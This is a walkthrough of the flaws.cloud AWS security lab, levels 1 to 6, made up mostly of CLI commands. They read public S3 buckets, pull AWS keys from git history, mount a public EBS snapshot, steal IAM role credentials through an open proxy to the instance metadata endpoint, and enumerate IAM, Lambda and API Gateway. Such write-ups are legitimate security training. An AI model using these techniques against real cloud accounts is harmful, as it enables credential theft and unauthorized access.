
### Level 1: http://flaws.cloud

**Vulnerability:** bucket's listing access permission set to "Everyone"

```
# determine region
$ host flaws.cloud
$ host <IP>
# list bucket content
$ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
# get interesting file
$ aws s3 cp s3://flaws.cloud/secret-dd02c7c.html --no-sign-request --region us-west-2 secret-dd02c7c.html
$ cat secret-dd02c7c.html
```

### Level 2: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud

**Vulnerability:** bucket's listing access permission set to "Any Authenticated AWS User"

    $ aws s3 --profile mzetAccount ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
    $ aws s3 --profile mzetAccount cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html secret-e4443fc.html

### Level 3: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud

**Vulnerability:** bucket listing access to 'Everyone' + leaking AWS keys by accidently commiting it to git repo kept in the bucket

```
$ aws s3 ls http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --no-sign-request --region us-west-2
# download content of the bucket:
$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
# retreive secret from git history: 
$ git log 
$ git stash
$ git checkout f7cebc46b471ca9838a0bdd1074bb498a3f84c87
$ cat secret.txt
# create new profile with found AWS keys & list all available buckets for this account:
$ aws configure --profile flaws.cloud
$ aws --profile flaws.cloud s3 ls
```

### Level 4: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud

**Vulnerability:** snapshot of EC2 instance is made accessible to all AWS users (is made 'Public')

```
# identify DNS name of EC2 instance:
$ host 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

# look for snapshot of ec2-35-165-182-7.us-west-2.compute.amazonaws.com machine:

# first get identity of keys that are used (to filter snapshots only for this user)
$ aws --profile flaws.cloud sts get-caller-identity
# get all snapshots of this (owner-id) user. Note that request is done by other AWS user
$ aws --profile mzetAccount ec2 describe-snapshots --owner-id 975426262029 --region us-west-2

OR (filter by volume-id):

$ aws --profile flaws.cloud ec2 describe-instances | grep -i volumeid
# get all snapshots of this volume
$ aws --profile mzetAccount ec2 describe-snapshots --filter "Name=volume-id,Values=vol-04f1c039bc13ea950" --region us-west-2

# create volume from the snapshot:
$ aws --profile mzetAccount ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89

# In AWS Console:
# create EC2 instance with second volume (snap-0b49342abd1bdcb89) attached

# SSH into created instance:
$ ssh -i ".ssh/key.pem" <user>@<instance-ip>
$ sudo mount /dev/xvdb1 /mnt
$ cat /mnt/home/ubuntu/setupNginx.sh
```

### Level 5: http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/

**Vulnerability:** exposed proxy which doesn't restrict access to instance's meta-data server and private IP range

```
# attempt to access meta-adata via proxy
$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/

# access instance's credentials via proxy (flaws is a role with which instanse is associated)
$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws

# use exposed credentials (from the command above) to list level6 bucket:
$ export AWS_SESSION_TOKEN="<AWS_SESSION_TOKEN>"
$ AWS_ACCESS_KEY_ID='<AWS_ACCESS_KEY_ID>' AWS_SECRET_ACCESS_KEY='<AWS_SECRET_ACCESS_KEY>' aws s3 ls --recursive s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
```

### Level 6: level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/

**Vulnerability:** excessive perimssions ('SecurityAudit' policy) are given

```
# confirm your 'level6' identity:
$ aws --profile flaws.cloud3 iam get-user
OR
$ aws --profile flaws.cloud3 sts get-caller-identity

# run scout2 tool: 
$ python Scout2.py --profile flaws.cloud3

# identify/confirm policies attached to 'level6' user (scout2 output should catch your attention on this):
$ aws --profile flaws.cloud3 iam list-attached-user-policies --user-name Level6

# get info about 'list_apigateway' policy:
$ aws --profile flaws.cloud3 iam get-policy --policy-arn "arn:aws:iam::975426262029:policy/list_apigateways"
$ aws --profile flaws.cloud3 iam get-policy-version --policy-arn "arn:aws:iam::975426262029:policy/list_apigateways" --
version-id v4

# AWS API gateways are commonly used to run AWS Lambda managed code, let's whether that's the case here:
$ aws --region us-west-2 --profile flaws.cloud3 lambda list-functions
$ aws --region us-west-2 --profile flaws.cloud3 lambda get-policy --function-name Level6
$ aws --profile flaws.cloud3 --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"

# finally, using: we can construct Lambda function URL:
https://<rest-api-id>.execute-api.<region>.amazonaws.com/<stage-name>/<function-name>
https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6

# visiting this URL reveals final link:
http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/
```
